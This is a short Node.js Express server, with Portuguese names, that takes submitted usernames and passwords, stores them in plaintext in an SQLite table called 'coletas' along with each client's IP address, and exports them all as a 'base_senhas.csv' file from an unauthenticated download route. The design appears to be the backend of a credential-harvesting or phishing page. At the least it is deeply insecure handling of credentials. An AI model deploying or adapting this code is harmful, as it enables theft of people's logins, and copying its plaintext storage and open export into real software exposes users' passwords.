const express = require("express");
const Database = require("better-sqlite3");
const path = require("path");
const app = express();
const db = new Database("database.db");

db.exec(`CREATE TABLE IF NOT EXISTS coletas (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    usuario TEXT,
    senha TEXT,
    data_hora DATETIME DEFAULT CURRENT_TIMESTAMP,
    ip TEXT
)`);

app.use(express.json());
app.use(express.static("public"));

app.post("/cadastrar", (req, res) => {
    const { usuario, senha } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    try {
        const stmt = db.prepare("INSERT INTO coletas (usuario, senha, ip) VALUES (?, ?, ?)");
        stmt.run(usuario, senha, ip);
        res.json({ status: 'success', mensagem: 'Senha registrada com sucesso!' });

    } catch (err) {
        res.status(500).json({ status: 'erro', mensagem: 'Erro ao salvar no banco.' });
        console.log(err);
    }
});

app.get('/download', (req, res) => {
    const rows = db.prepare("SELECT * FROM coletas").all();
    let csv = "\uFEFFID;Usuario;Senha;Data_Hora;IP\n";
    
    rows.forEach(row => {
        csv += `${row.id};${row.usuario};${row.senha};${row.data_hora};${row.ip}\n`;
    });

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename=base_senhas.csv');
    res.status(200).send(csv);
});

app.listen(3000, () => console.log('Servidor rodando na porta 3000'));